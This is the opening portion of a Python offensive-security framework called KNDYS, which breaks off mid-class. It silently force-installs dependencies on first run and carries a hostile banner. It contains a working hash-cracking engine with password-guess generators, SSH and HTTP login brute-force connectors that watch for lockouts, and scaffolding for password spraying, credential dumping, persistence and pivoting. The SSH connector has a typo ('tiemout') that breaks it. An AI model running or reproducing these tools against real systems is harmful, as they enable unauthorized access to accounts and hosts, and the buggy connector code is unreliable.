#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
KNDYS Framework - Penetration Testing Framework
Auto-installer: Just run ./kndys.py and dependencies will be installed automatically
"""

import os
import sys
import subprocess

# Auto-install dependencies if missing
def check_and_install_dependencies():
    """Check and auto-install required dependencies"""
    missing_packages = []
    required_packages = {
        'requests': 'requests>=2.31.0',
        'colorama': 'colorama>=0.4.6',
        'bs4': 'beautifulsoup4>=4.12.0',
        'lxml': 'lxml>=4.9.0',
        'urllib3': 'urllib3>=2.0.0',
        'cryptography': 'cryptography>=41.0.0',
        'Crypto': 'pycryptodome>=3.19.0',
        'jwt': 'PyJWT>=2.8.0',
        'scapy': 'scapy>=2.5.0',
        'nmap': 'python-nmap>=0.7.1',
        'paramiko': 'paramiko>=3.3.0',
        'dns': 'dnspython>=2.4.0',
        'netifaces': 'netifaces>=0.11.0',
        'selenium': 'selenium>=4.15.0',
        'webdriver_manager': 'webdriver-manager>=4.0.0',
        'qrcode': 'qrcode>=7.4.0',
        'PIL': 'Pillow>=10.1.0',
        'twilio': 'twilio>=8.10.0',
        'yaml': 'pyyaml>=6.0.0',
        'tqdm': 'tqdm>=4.66.0',
        'validators': 'validators>=0.22.0'
    }
    
    # Check which packages are missing
    for module_name, package_spec in required_packages.items():
        try:
            __import__(module_name)
        except ImportError:
            missing_packages.append(package_spec)
    
    # Auto-install missing packages
    if missing_packages:
        print(f"\033[1;33m[!] First run detected - installing {len(missing_packages)} dependencies...\033[0m")
        print(f"\033[0;36m[*] This is a one-time setup and will take a few minutes.\033[0m\n")
        
        try:
            # Try regular pip install first
            cmd = [sys.executable, '-m', 'pip', 'install', '--quiet'] + missing_packages
            subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"\033[0;32m[] All dependencies installed successfully!\033[0m\n")
        except subprocess.CalledProcessError:
            # If that fails, try with --break-system-packages for modern systems
            try:
                cmd = [sys.executable, '-m', 'pip', 'install', '--break-system-packages', '--quiet'] + missing_packages
                subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"\033[0;32m[] All dependencies installed successfully!\033[0m\n")
            except subprocess.CalledProcessError as e:
                print(f"\033[0;31m[] Auto-install failed. Please run manually:\033[0m")
                print(f"\033[0;36m pip3 install {' '.join(missing_packages)}\033[0m")
                print(f"\033[0;33m Or with: pip3 install --break-system-packages {' '.join(missing_packages)}\033[0m\n")
                sys.exit(1)

# Run dependency check on first import
check_and_install_dependencies()

# Now import everything else
import time
import random
import threading
import socket
import json
import hashlib
import base64
import re
import ssl
import zipfile
import tarfile
import gzip
import csv
import shutil
import fnmatch
import stat
import xml.etree.ElementTree as ET
from datetime import datetime, timezone
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qsl
import concurrent.futures
import ipaddress
import itertools
import string
import struct
import platform
import argparse
try:
    import readline
except ImportError:
    readline = None
import getpass
import mimetypes
import html
import secrets
try:
    import urllib3
except ImportError:
    urllib3 = None
import shlex
from pathlib import Path
from dataclasses import dataclass, field
from typing import Dict, List, Tuple, Optional, Any, Callable
from functools import wraps
from collections import deque, Counter, OrderedDict
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
import queue
import logging

# External libraries (install with: pip install -r requirements.txt)
try:
    import requests
    if urllib3:
        try:
            from urllib3.exceptions import InsecureRequestWarning
            urllib3.disable_warnings(InsecureRequestWarning)
        except Exception:
            pass
except ImportError:
    print("[-] Requests library not found. Install with: pip install requests")
    sys.exit(1)

try:
    from colorama import Fore, Style, Back, init
    init(autoreset=True)
    COLORS = True
except ImportError:
    class Fore:
        RED = YELLOW = GREEN = BLUE = MAGENTA = CYAN = WHITE = RESET = ''

    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ''

    class Back:
        BLACK = RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ''

    def init(*args, **kwargs):
        return False

    COLORS = False

try:
    from cryptography import x509
    from cryptography.fernet import Fernet
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import paramiko
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False

try:
    from scapy.all import *
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    import dns
    DNS_AVAILABLE = True
except ImportError:
    dns = None
    DNS_AVAILABLE = False

try:
    import sqlite3
    DB_AVAILABLE = True
except ImportError:
    DB_AVAILABLE = False

try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

try:
    import pwd
    PWD_AVAILABLE = True
except ImportError:
    PWD_AVAILABLE = False

try:
    import grp
    GRP_AVAILABLE = True
except ImportError:
    GRP_AVAILABLE = False

try:
    from passlib.hash import bcrypt, sha256_crypt, sha512_crypt
    PASSLIB_AVAILABLE = True
except ImportError:
    PASSLIB_AVAILABLE = False

try:
    from twilio.rest import Client as TwilioClient
    TWILIO_AVAILABLE = True
except ImportError:
    TwilioClient = None
    TWILIO_AVAILABLE = False

# Banner
BANNER = f"""
{Fore.MAGENTA}{Style.BRIGHT}
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ ██╗ ██╗███╗ ██╗██████╗ ██╗ ██╗ ███████╗ {Fore.CYAN}{Style.BRIGHT} OFFENSIVE SYSTEM{Fore.MAGENTA}{Style.BRIGHT} ┃
┃ ██║ ██╔╝████╗ ██║██╔══██╗╚██╗ ██╔╝ ██╔════╝ {Fore.CYAN}{Style.BRIGHT}signal console online{Fore.MAGENTA}{Style.BRIGHT} ┃
┃ █████╔╝ ██╔██╗ ██║██║ ██║ ╚████╔╝ ███████╗ ┃
┃ ██╔═██╗ ██║╚██╗██║██║ ██║ ╚██╔╝ ╚════██║ ┃
┃ ██║ ██╗██║ ╚████║██████╔╝ ██║ ███████║ ┃
┃ ╚═╝ ╚═╝╚═╝ ╚═══╝╚═════╝ ╚═╝ ╚══════╝ ┃
┣━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ SIGNAL FEED ┃ core.grid = SYNCHRONIZED ┃
┃ ┃ type = LOW_PROFILE ┃
┃ ┃ payload.bank = 37 vectors ready ┃
┣━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ TERMINAL ┃ Aida will judge you, ┃
┃ ┃ You will scare them, ┃
┃ TELEMETRY ┃ And i will vanish. ┃
┃ ┃ Go for it ┃
┣━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ VECTORS ┃ fuck them ┃
┗━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
{Style.RESET_ALL}"""

# ============ SECURITY AND UTILITY CLASSES ============
 
class InputValidator:
    """Input validation and sanitization"""
    
    @staticmethod
    def validate_ip(ip_str):
        """Validate IP address"""
        try:
            ipaddress.ip_address(ip_str)
            return True
        except ValueError:
            return False
    
    @staticmethod
    def validate_port(port):
        """Validate port number"""
        try:
            port_num = int(port)
            return 1 <= port_num <= 65535
        except (ValueError, TypeError):
            return False
    
    @staticmethod
    def validate_url(url):
        """Validate URL format"""
        try:
            result = urlparse(url)
            return all([result.scheme in ['http', 'https'], result.netloc])
        except:
            return False
    
    @staticmethod
    def sanitize_command(cmd):
        """Sanitize command for safe execution"""
        # Remove dangerous characters
        dangerous = [';', '|', '&', '`', '$', '(', ')', '<', '>', '\n', '\r']
        sanitized = cmd
        for char in dangerous:
            if char in sanitized:
                return None # Reject dangerous commands
        return sanitized
    
    @staticmethod
    def sanitize_path(path):
        """Sanitize file path"""
        # Prevent directory traversal
        if '..' in path or path.startswith('/'):
            return None
        return os.path.normpath(path)
    
    @staticmethod
    def validate_email(email):
        """Validate email address"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None

class RateLimiter:
    """Rate limiting for requests"""
    
    def __init__(self, max_requests=10, time_window=60):
        self.max_requests = max_requests
        self.time_window = time_window
        self.requests = deque()
        self.lock = threading.Lock()
    def allow_request(self):
        """Check if request is allowed"""
        with self.lock:
            now = time.time()
            
            # Remove old requests outside time window
            while self.requests and self.requests[0] < now - self.time_window:
                self.requests.popleft()
            
            # Check if we've exceeded limit
            if len(self.requests) >= self.max_requests:
                return False
            
            # Add new request
            self.requests.append(now)
            return True
    
    def wait_if_needed(self):
        """Wait if rate limit exceeded"""
        while not self.allow_request():
            time.sleep(0.1)


HASH_LENGTH_MAP = {
    32: ['md5', 'ntlm'],
    40: ['sha1'],
    56: ['sha224'],
    64: ['sha256', 'sha3_256'],
    96: ['sha384'],
    128: ['sha512', 'sha3_512']
}

MASK_TOKEN_MAP = {
    'l': string.ascii_lowercase,
    'u': string.ascii_uppercase,
    'd': string.digits,
    's': '!@#$%^&*()-_=+[]{};:,<.>/?',
    'a': string.ascii_letters + string.digits
}

SMART_SUBSTITUTIONS = str.maketrans({'a': '@', 'i': '1', 'e': '3', 'o': '0', 's': '$'})
SMART_SUFFIXES = ('!', '1', '123', '2024', '2025')


@dataclass
class HashTarget:
    """Represents a hash that needs to be cracked."""

    digest: str
    algorithm: str
    salt: str = ''
    salt_position: str = 'suffix'
    source: str = 'inline'
    cracked_password: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class HashCrackSummary:
    """Structured summary returned by the cracking engine."""

    attempts: int
    duration: float
    cracked: List[HashTarget]
    remaining: int
    errors: List[str]
    stopped: bool
    stop_reason: Optional[str] = None


class HashAlgorithmRegistry:
    """Registry for supported hash algorithms with unified verification."""

    def __init__(self):
        self._digest_algorithms: Dict[str, Callable[[bytes], str]] = {}
        self._verifiers: Dict[str, Callable[[str, str], bool]] = {}
        self._register_defaults()

    def _register_defaults(self):
        digest_candidates = [
            'md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512',
            'sha3_256', 'sha3_512', 'blake2b', 'blake2s'
        ]
        for name in digest_candidates:
            if name in hashlib.algorithms_available:
                self._digest_algorithms[name] = lambda payload, algo=name: hashlib.new(algo, payload).hexdigest()

        if 'md4' in hashlib.algorithms_available:
            self._digest_algorithms['ntlm'] = lambda payload: hashlib.new('md4', payload).hexdigest()

        if PASSLIB_AVAILABLE:
            self._verifiers['bcrypt'] = bcrypt.verify
            self._verifiers['sha256_crypt'] = sha256_crypt.verify
            self._verifiers['sha512_crypt'] = sha512_crypt.verify

    def supports(self, algorithm: str) -> bool:
        algo = (algorithm or '').lower()
        return algo in self._digest_algorithms or algo in self._verifiers

    def available_algorithms(self) -> List[str]:
        return sorted(set(self._digest_algorithms.keys()) | set(self._verifiers.keys()))

    def verify_target(
        self,
        target: HashTarget,
        candidate: str,
        *,
        encoding: str = 'utf-8',
        case_sensitive: bool = True
    ) -> bool:
        algo = target.algorithm.lower()
        if algo in self._verifiers:
            verifier = self._verifiers[algo]
            try:
                return verifier(candidate, target.digest)
            except Exception:
                return False

        digest_func = self._digest_algorithms.get(algo)
        if digest_func is None:
            raise ValueError(f"Unsupported hash algorithm '{algo}'")

        payload = self._prepare_payload(candidate, target, encoding, case_sensitive, algo)
        return digest_func(payload).lower() == target.digest.lower()

    def _prepare_payload(
        self,
        candidate: str,
        target: HashTarget,
        encoding: str,
        case_sensitive: bool,
        algorithm: str
    ) -> bytes:
        normalized = candidate if case_sensitive else candidate.lower()
        codec = 'utf-16le' if algorithm == 'ntlm' else encoding
        try:
            base = normalized.encode(codec, errors='ignore')
        except LookupError:
            base = normalized.encode('utf-8', errors='ignore')
        if target.salt:
            salt_bytes = target.salt.encode(codec, errors='ignore')
            if target.salt_position == 'prefix':
                return salt_bytes + base
            return base + salt_bytes
        return base


def identify_hash_algorithm(digest: str) -> Optional[str]:
    """Best-effort hash type detection based on digest format."""

    if not digest:
        return None

    value = digest.strip()
    lower_value = value.lower()

    if lower_value.startswith(('$2a$', '$2b$', '$2y$')):
        return 'bcrypt'
    if lower_value.startswith('$5$'):
        return 'sha256_crypt'
    if lower_value.startswith('$6$'):
        return 'sha512_crypt'

    if all(ch in string.hexdigits for ch in value):
        candidates = HASH_LENGTH_MAP.get(len(value))
        if candidates:
            return candidates[0]
    return None


def stream_wordlist(path: Path, encoding: str = 'utf-8'):
    """Yield passwords from disk without loading the entire file into memory."""

    suffix = path.suffix.lower()
    if suffix == '.gz':
        def generator():
            with gzip.open(path, 'rt', encoding=encoding, errors='ignore') as handle:
                for line in handle:
                    yield line.strip()
        return generator()

    if suffix == '.zip':
        def generator():
            with zipfile.ZipFile(path) as archive:
                for member in archive.namelist():
                    if member.endswith('/'):
                        continue
                    with archive.open(member) as handle:
                        for raw in handle:
                            try:
                                yield raw.decode(encoding, errors='ignore').strip()
                            except UnicodeDecodeError:
                                continue
                    break
        return generator()

    def generator():
        with open(path, 'r', encoding=encoding, errors='ignore') as handle:
            for line in handle:
                yield line.strip()
    return generator()


def generate_mask_candidates(mask: str, limit: int):
    """Generate candidates from a mask similar to Hashcat notation."""

    if not mask:
        return iter(())

    charsets = []
    idx = 0
    while idx < len(mask):
        token = mask[idx]
        if token == '?' and idx + 1 < len(mask):
            charset = MASK_TOKEN_MAP.get(mask[idx + 1])
            if charset:
                charsets.append(charset)
                idx += 2
                continue
        charsets.append(mask[idx])
        idx += 1

    if not charsets:
        return iter(())

    def generator():
        produced = 0
        normalized_charsets = [list(chars) if isinstance(chars, str) else list(chars) for chars in charsets]
        for combo in itertools.product(*normalized_charsets):
            yield ''.join(combo)
            produced += 1
            if limit and produced >= limit:
                break

    return generator()


def apply_smart_rules(candidate: str) -> List[str]:
    """Generate a limited set of smart mutations for a password candidate."""

    variations = set()
    variations.add(candidate)
    variations.add(candidate.capitalize())
    variations.add(candidate.upper())
    variations.add(candidate[::-1])
    translated = candidate.translate(SMART_SUBSTITUTIONS)
    variations.add(translated)
    for suffix in SMART_SUFFIXES:
        variations.add(f"{candidate}{suffix}")
    variations.discard(candidate)
    return [value for value in variations if value]


def iter_default_patterns(limit: int = 5000):
    """Yield pragmatic fallback patterns (dates, numeric pins, common words)."""

    produced = 0
    current_year = datetime.now().year
    bases = ['password', 'welcome', 'admin', 'letmein', 'summer', 'winter', 'spring', 'autumn']
    for base in bases:
        for suffix in ['', '1', '123', '2024', '2025', '!']:
            yield f"{base}{suffix}"
            produced += 1
            if produced >= limit:
                return

    for pin in range(0, 10000):
        yield f"{pin:04d}"
        produced += 1
        if produced >= limit:
            return

    for year in range(1990, current_year + 1):
        for month in range(1, 13):
            candidate = f"{month:02d}{year}"
            yield candidate
            produced += 1
            if produced >= limit:
                return


class HashCrackerEngine:
    """Concurrent hash cracking engine with streaming wordlist support."""

    def __init__(self, registry: HashAlgorithmRegistry, limiter: Optional[RateLimiter] = None):
        self.registry = registry
        self.limiter = limiter

    def crack(
        self,
        targets: List[HashTarget],
        *,
        candidates,
        encoding: str = 'utf-8',
        case_sensitive: bool = True,
        max_workers: int = 4,
        chunk_size: int = 1000,
        stop_event: Optional[threading.Event] = None,
        progress_callback: Optional[Callable[[str, Dict[str, Any]], None]] = None,
        progress_interval: float = 5.0,
        max_runtime: float = 0.0
    ) -> HashCrackSummary:
        stop_event = stop_event or threading.Event()
        attempts_counter = {'value': 0}
        errors: List[str] = []
        cracked_ids = set()
        total_targets = len(targets)
        start_time = time.time()
        next_status = start_time + progress_interval
        futures: set = set()
        stop_reason: Optional[str] = None

        def emit_status(force=False):
            nonlocal next_status
            if not progress_callback:
                return
            now = time.time()
            if force or now >= next_status:
                elapsed = max(now - start_time, 0.001)
                progress_callback('status', {
                    'attempts': attempts_counter['value'],
                    'cracked': len(cracked_ids),
                    'total': total_targets,
                    'rate': attempts_counter['value'] / elapsed,
                    'elapsed': elapsed
                })
                next_status = now + progress_interval

        def process_chunk(chunk):
            local_matches = []
            local_attempts = 0
            for candidate in chunk:
                if stop_event.is_set():
                    break
                local_attempts += 1
                if self.limiter:
                    self.limiter.wait_if_needed()
                for idx, target in enumerate(targets):
                    if target.cracked_password is not None:
                        continue
                    if self.registry.verify_target(target, candidate, encoding=encoding, case_sensitive=case_sensitive):
                        local_matches.append((idx, candidate))
            return local_attempts, local_matches

        def consume_futures(force=False):
            nonlocal futures, stop_reason
            if not futures:
                return
            pending = set()
            for future in list(futures):
                if force or future.done():
                    try:
                        chunk_attempts, matches = future.result()
                    except Exception as exc:
                        errors.append(str(exc))
                        continue
                    attempts_counter['value'] += chunk_attempts
                    for idx, password in matches:
                        if idx in cracked_ids:
                            continue
                        target = targets[idx]
                        target.cracked_password = password
                        cracked_ids.add(idx)
                        if progress_callback:
                            progress_callback('match', {
                                'target': target,
                                'password': password,
                                'attempts': attempts_counter['value'],
                                'elapsed': time.time() - start_time
                            })
                    emit_status()
                    if total_targets and len(cracked_ids) == total_targets:
                        stop_event.set()
                        stop_reason = stop_reason or 'completed'
                else:
                    pending.add(future)
            futures = pending

        chunk_buffer: List[str] = []
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=max_workers)
        try:
            for candidate in candidates:
                if stop_event.is_set():
                    break
                chunk_buffer.append(candidate)
                if len(chunk_buffer) >= chunk_size:
                    futures.add(executor.submit(process_chunk, list(chunk_buffer)))
                    chunk_buffer.clear()
                    consume_futures()
                if max_runtime and (time.time() - start_time) >= max_runtime:
                    stop_reason = 'runtime'
                    stop_event.set()
                    break

            if chunk_buffer and not stop_event.is_set():
                futures.add(executor.submit(process_chunk, list(chunk_buffer)))
                chunk_buffer.clear()

            consume_futures(force=True)
            emit_status(force=True)
        finally:
            executor.shutdown(wait=True)

        duration = time.time() - start_time
        summary = HashCrackSummary(
            attempts=attempts_counter['value'],
            duration=duration,
            cracked=[t for t in targets if t.cracked_password],
            remaining=max(total_targets - len(cracked_ids), 0),
            errors=errors,
            stopped=stop_event.is_set(),
            stop_reason=stop_reason
        )
        return summary


@dataclass
class AttemptOutcome:
    """Normalized response for a brute force credential attempt."""
    success: bool
    evidence: Optional[str] = None
    error: Optional[str] = None
    lockout: bool = False
    fatal: bool = False
    latency: float = 0.0


@dataclass
class BruteForceSuccess:
    """Structured record captured when a credential succeeds."""
    username: str
    service: str
    target: str
    password_preview: str
    password_hash: str
    evidence: Optional[str]
    latency: float
    timestamp: str


@dataclass
class SprayAttemptRecord:
    username: str
    password: str
    status: str
    latency: float
    response: Optional[str] = None


@dataclass
class SpraySuccessRecord:
    username: str
    password_preview: str
    password_hash: str
    target: str
    service: str
    evidence: Optional[str]
    timestamp: str


@dataclass
class SpraySummary:
    attempts: int
    successes: int
    locked: int
    duration: float
    rate: float
    warnings: List[str]
    errors: List[str]


class BaseBruteForceConnector:
    """Base connector for brute force attempts."""

    name = 'base'

    def __init__(self, framework):
        self.framework = framework

    def prepare(self, profile):
        return profile

    def attempt(self, username, password, profile):
        raise NotImplementedError

    def close(self):
        return


class SSHBruteForceConnector(BaseBruteForceConnector):
    """SSH credential tester built on Paramiko."""

    name = 'ssh'

    def prepare(self, profile):
        if not SSH_AVAILABLE:
            raise RuntimeError('paramiko not installed; cannot run SSH brute force')
        self.host = profile['host']
        self.port = profile['port']
        self.command = profile['ssh_command']
        self.timeout = profile['ssh_timeout']
        return profile

    def attempt(self, username, password, profile):
        pool = getattr(self.framework, 'connection_pool', None)
        if pool:
            pool.acquire()
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                self.host,
                port=self.port,
                username=username,
                password=password,
                timeout=self.timeout,
                auth_timeout=self.timeout,
                banner_timeout=self.tiemout 
            )
            evidence = None
            if self.command:
                try:
                    stdin, stdout, stderr = ssh.exec_command(self.command, timeout=self.timeout)
                    evidence = stdout.read().decode('utf-8', errors='ignore').strip()
                except Exception:
                    evidence = 'Command execution failed'
            ssh.close()
            return AttemptOutcome(success=True, evidence=evidence or 'SSH login OK')
        except paramiko.AuthenticationException:
            return AttemptOutcome(success=False, error='auth_failed')
        except paramiko.ssh_exception.SSHException as exc:
            detail = str(exc)
            lockout = 'too many' in detail.lower() or 'locked' in detail.lower()
            return AttemptOutcome(success=False, error=detail or 'ssh_exception', lockout=lockout)
        except Exception as exc:
            return AttemptOutcome(success=False, error=str(exc)[:200])
        finally:
            if pool:
                pool.release()


class HTTPBruteForceConnector(BaseBruteForceConnector):
    """HTTP/HTTPS form brute force helper."""

    name = 'http'

    def prepare(self, profile):
        self.session = requests.Session()
        self.session.verify = profile['http_verify']
        if profile['http_headers']:
            self.session.headers.update(profile['http_headers'])
        self.timeout = profile['http_timeout']
        self.allow_redirects = profile['http_allow_redirects']
        self.format = profile['http_format']
        return profile

    def attempt(self, username, password, profile):
        payload = dict(profile['http_extra_fields'])
        payload[profile['http_username_field']] = username
        payload[profile['http_password_field']] = password
        method = profile['http_method'].upper()
        request_kwargs = {
            'timeout': self.timeout,
            'allow_redirects': self.allow_redirects
        }
        if self.format == 'json':
            request_kwargs['json'] = payload
        else:
            request_kwargs['data'] = payload
        try:
            response = self.session.request(method, profile['target'], **request_kwargs)
        except requests.RequestException as exc:
            fatal = isinstance(exc, requests.exceptions.ConnectionError)
            return AttemptOutcome(success=False, error=str(exc)[:200], fatal=fatal)
        body = response.text.lower()
        success = any(token in body for token in profile['http_success_indicators'])
        success = success or response.status_code in profile['http_success_codes']
        lockout = response.status_code in profile['http_lockout_codes']
        if not lockout:
            lockout = any(token in body for token in profile['http_lockout_indicators'])
        evidence = f"HTTP {response.status_code}"
        if success:
            return AttemptOutcome(success=True, evidence=evidence)
        if lockout:
            return AttemptOutcome(success=False, error='lockout_detected', lockout=True)
        return AttemptOutcome(success=False, error='invalid_credentials')

    def close(self):
        if hasattr(self, 'session'):
            self.session.close()


class MockBruteForceConnector(BaseBruteForceConnector):
    """Deterministic connector used for testing and dry-runs."""

    name = 'mock'

    def prepare(self, profile):
        self.success_password = profile.get('mock_success_password', 'letmein')
        self.success_pairs = profile.get('mock_valid_pairs', {}) or {}
        self.lockout_after = profile.get('mock_lockout_after', 0)
        self.failure_counter = Counter()
        return profile

    def attempt(self, username, password, profile):
        normalized_user = username.strip()
        if self.lockout_after and self.failure_counter.get(normalized_user, 0) >= self.lockout_after:
            return AttemptOutcome(success=False, error='simulated lockout', lockout=True)
        target_password = self.success_pairs.get(normalized_user, self.success_password)
        if password == target_password:
            return AttemptOutcome(success=True, evidence='mock-success')
        self.failure_counter[normalized_user] += 1
        return AttemptOutcome(success=False, error='mock-failure')

@dataclass
class ShellCommandRecord:
    """Structured record of executed shell commands"""
    cmd: str
    timestamp: float
    duration: float
    exit_code: int
    stdout: str
    stderr: str

    @property
    def success(self) -> bool:
        return self.exit_code == 0

    def to_history_entry(self, capture_limit: int) -> Dict[str, Any]:
        """Return a trimmed dict representation suitable for session history"""
        preview_limit = max(1, capture_limit)
        return {
            'cmd': self.cmd,
            'timestamp': self.timestamp,
            'duration': round(self.duration, 4),
            'exit_code': self.exit_code,
            'success': self.success,
            'stdout': (self.stdout or '')[:preview_limit],
            'stderr': (self.stderr or '')[:preview_limit]
        }


@dataclass
class ExplorerEntry:
    """Detailed file explorer entry metadata"""
    name: str
    path: str
    type: str
    size: int
    modified: float
    permissions: str
    owner: str
    group: str
    depth: int
    hash: Optional[str] = None
    preview: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        return {
            'name': self.name,
            'path': self.path,
            'type': self.type,
            'size': self.size,
            'modified': self.modified,
            'permissions': self.permissions,
            'owner': self.owner,
            'group': self.group,
            'depth': self.depth,
            'hash': self.hash,
            'preview': self.preview
        }


@dataclass
class ExplorerSummary:
    """Aggregated statistics for file explorer runs"""
    base_path: str
    total_entries: int
    files: int
    directories: int
    other: int
    total_size: int
    depth_reached: int
    truncated: bool
    errors: int


@dataclass
class PrivEscFinding:
    """Structured privilege escalation finding"""
    category: str
    title: str
    severity: str
    description: str
    evidence: str
    remediation: str
    references: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self):
        return {
            'category': self.category,
            'title': self.title,
            'severity': self.severity,
            'description': self.description,
            'evidence': self.evidence,
            'remediation': self.remediation,
            'references': self.references,
            'metadata': self.metadata 
        }


@dataclass
class PrivEscSummary:
    """Summary metrics for privilege escalation checks"""
    session_id: str
    checks_run: List[str]
    total_findings: int
    severity_map: Dict[str, int]
    runtime: float
    errors: int


@dataclass
class CredentialArtifact:
    """Normalized view of captured credential-bearing artifacts"""
    source: str
    category: str
    path: str
    artifact_type: str
    confidence: str
    preview: str
    hash_preview: str
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            'source': self.source,
            'category': self.category,
            'path': self.path,
            'artifact_type': self.artifact_type,
            'confidence': self.confidence,
            'preview': self.preview,
            'hash_preview': self.hash_preview,
            'metadata': self.metadata
        }


@dataclass
class CredentialDumpSummary:
    """Execution summary for credential dumping operations"""
    session_id: str
    target_os: str
    mode: str
    total_artifacts: int
    categories: Dict[str, int]
    warnings: int
    errors: int
    duration: float


@dataclass
class PersistenceTechnique:
    """Describes a persistence option with setup and cleanup steps"""
    identifier: str
    os_family: str
    category: str
    title: str
    description: str
    risk: str
    commands: List[str]
    cleanup: List[str]
    detection: List[str]
    prerequisites: List[str]
    automation: str

    def to_dict(self) -> Dict[str, Any]:
        return {
            'id': self.identifier,
            'os': self.os_family,
            'category': self.category,
            'title': self.title,
            'description': self.description,
            'risk': self.risk,
            'commands': self.commands,
            'cleanup': self.cleanup,
            'detection': self.detection,
            'prerequisites': self.prerequisites,
            'automation': self.automation
        }


@dataclass
class PersistencePlan:
    """Aggregated persistence playbook for a session"""
    session_id: str
    target_os: str
    methods_requested: List[str]
    techniques: List[PersistenceTechnique]
    warnings: List[str]
    errors: List[str]
    generated_at: str

    def to_dict(self) -> Dict[str, Any]:
        return {
            'session': self.session_id,
            'target_os': self.target_os,
            'methods_requested': self.methods_requested,
            'techniques': [tech.to_dict() for tech in self.techniques],
            'warnings': self.warnings,
            'errors': self.errors,
            'generated_at': self.generated_at
        }


@dataclass
class PivotTechnique:
    """Supported pivoting technique definition"""
    identifier: str
    category: str
    transport: str
    title: str
    description: str
    risk: str
    commands: List[str]
    cleanup: List[str]
    detection: List[str]
    requirements: List[str]
    metrics: Dict[str, Any]

    def to_dict(self) -> Dict[str, Any]:
        return {
            'id': self.identifier,
            'category': self.category,
            'transport': self.transport,
            'title': self.title,
            'description': self.description,
            'risk': self.risk,
            'commands': self.commands,
            'cleanup': self.cleanup,
            'detection': self.detection,
            'requirements': self.requirements,
            'metrics': self.metrics
        }


@dataclass
class PivotRoute:
    """Concrete pivot route recommendation"""
    name: str
    entry_host: str
    target_network: str
    technique: PivotTechnique
    score: float
    notes: str

    def to_dict(self) -> Dict[str, Any]:
        return {
            'name': self.name,
            'entry_host': self.entry_host,
            'target_network': self.target_network,
            'technique': self.technique.to_dict(),
            'score': self.score,
            'notes': self.notes
        }


@dataclass
class PivotPlan:
    """Aggregated pivot strategy"""
    session_id: str
    target_network: str
    entry_host: str
    methods_requested: List[str]
    transports_requested: List[str]
    routes: List[PivotRoute]
    warnings: List[str]
    errors: List[str]
    generated_at: str

    def to_dict(self) -> Dict[str, Any]:
        return {
            'session': self.session_id,
            'target_network': self.target_network,
            'entry_host': self.entry_host,
            'methods_requested': self.methods_requested,
            'transports_requested': self.transports_requested,
            'routes': [route.to_dict() for route in self.routes],
            'warnings': self.warnings,
            'errors': self.errors,
            'generated_at': self.generated_at
        }


class SessionManager:
    """Manage active sessions with timeouts"""
    
    def __init__(self):
        self.sessions = {}
        self.session_timeout = 3600 # 1 hour
        self.lock = threading.Lock()
    
    def create_session(self, session_id, data=None):
        """Create new session"""
        with self.lock:
            self.sessions[session_id] = {
                'data': data or {},
                'created': time.time(),
                'last_activity': time.time()
            }
        return session_id
    
    def get_session(self, session_id):
        """Get session data"""
        with self.lock:
            if session_id in self.sessions:
                session = self.sessions[session_id]
                
                # Check if session expired
                if time.time() - session['last_activity'] > self.session_timeout:
                    del self.sessions[session_id]
                    return None
                
                # Update last activity
                session['last_activity'] = time.time()
                return session['data']
            return None
    
    def update_session(self, session_id, data):
        """Update session data"""
        with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id]['data'].update(data)
                self.sessions[session_id]['last_activity'] = time.time()
    
    def close_session(self, session_id):
        """Close and cleanup session"""
        with self.lock:
            if session_id in self.sessions:
                del self.sessions[session_id]
    
    def cleanup_expired(self):
        """Cleanup expired sessions"""
        with self.lock:
            now = time.time()
            expired = [
                sid for sid, session in self.sessions.items()
                if now - session['last_activity'] > self.session_timeout
            ]
            for sid in expired:
                del self.sessions[sid]

class ConnectionPool:
    """Connection pooling and management"""
    
    def __init__(self, max_connections=50):
        self.max_connections = max_connections
        self.active_connections = 0
        self.semaphore = threading.Semaphore(max_connections)
        self.lock = threading.Lock()
    
    def acquire(self):
        """Acquire connection from pool"""
        self.semaphore.acquire()
        with self.lock:
            self.active_connections += 1
    
    def release(self):
        """Release connection back to pool"""
